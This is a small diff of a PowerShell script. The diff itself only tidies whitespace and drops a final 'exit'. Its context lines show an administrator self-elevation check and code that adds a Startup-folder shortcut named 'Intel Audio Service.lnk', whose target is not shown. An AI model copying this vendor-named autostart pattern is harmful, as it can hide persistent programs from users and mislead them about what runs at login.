@@ -7,7 +7,7 @@ if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
             Exit
       }
 }
-     
+
 # Remainder of script here
 $FolderPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 $ShortcutFile = "$FolderPath\Intel Audio Service.lnk"
@@ -63,5 +63,3 @@ if (Test-Path $ProjectPath\build) {
       Remove-Item -Force $ProjectPath\build
       Write-Output "Build path removed"
 }
-
-exit
